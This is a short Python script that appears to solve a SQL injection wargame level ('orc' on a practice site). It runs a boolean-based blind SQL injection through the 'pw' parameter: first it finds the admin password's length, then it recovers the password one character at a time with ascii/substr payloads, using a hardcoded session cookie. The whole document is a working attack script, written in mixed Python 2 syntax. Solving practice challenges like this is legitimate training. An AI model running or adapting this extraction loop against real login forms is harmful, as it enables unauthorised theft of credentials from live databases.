import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'PHPSESSID':'tfsjhlke5lqfekk5c1cqh9h8fb'}
length = 5
flag=""

while 1:
    params = {'pw': "' or length(pw)="+str(length)+"-- "}
    response = requests.get(url, headers=headers, cookies=cookies, params=params)
    status_code = response.status_code
    html_data = response.text
    print(response.url)
    if(html_data.find("Hello admin") != -1):
        print "Hello admin"
        print "length = "+str(length)
        break
    else:
        length+=1

for i in range(1,length+1):
    for j in range(48,123):
        params = {'pw': "' or id='admin' and  ascii(substr(pw,"+str(i)+",1))="+str(j)+"-- "}
        response = requests.get(url, headers=headers, cookies=cookies, params=params)
        status_code = response.status_code
        html_data = response.text
        print(response.url)
        if (html_data.find("Hello admin") != -1):
            print "Hello admin"
            flag+=chr(j)
            print flag
            break